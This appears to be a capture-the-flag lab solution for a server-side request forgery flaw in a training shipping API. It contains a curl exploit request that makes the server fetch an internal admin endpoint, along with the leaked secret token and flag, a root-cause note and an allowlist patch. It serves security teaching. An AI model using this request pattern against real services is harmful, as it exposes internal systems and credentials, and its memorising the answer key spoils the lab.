# Solution: API7:2023 Server-Side Request Forgery (SSRF)

## 1. Walkthrough & Exploitation

### Step 1: Send Internal Mock Service URL in Shipping Preview
```bash
curl -s -X POST http://127.0.0.1:8000/api/v1/shipping/fetch-label-preview \
  -H "Authorization: Bearer <ALICE_ACCESS_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"order_id": 1, "partner_label_url": "http://127.0.0.1:9000/internal/admin/system-metrics"}'
```

### Exploit Evidence
```json
{
  "status": "label_fetched",
  "order_id": 1,
  "partner_response": {
    "node": "partner-gateway-node-01",
    "secret_token": "INTERNAL_PARTNER_API_KEY_SECRET_7721"
  },
  "flag": "FLAG{API7_SSRF_INTERNAL_SERVICE_ACCESSED_9000}"
}
```

---

## 2. Root Cause Analysis
The application accepted user-controlled destination URLs directly and forwarded an HTTP client request to arbitrary internal paths without path allowlisting or URL sanitization.

---

## 3. Patched Implementation
```python
# FIX: API7-SSRF
ALLOWED_PATHS = ["/api/v1/dispatch", "/health"]
if parsed.path not in ALLOWED_PATHS:
    raise HTTPException(status_code=403, detail="Target path is not in approved allowlist.")
```
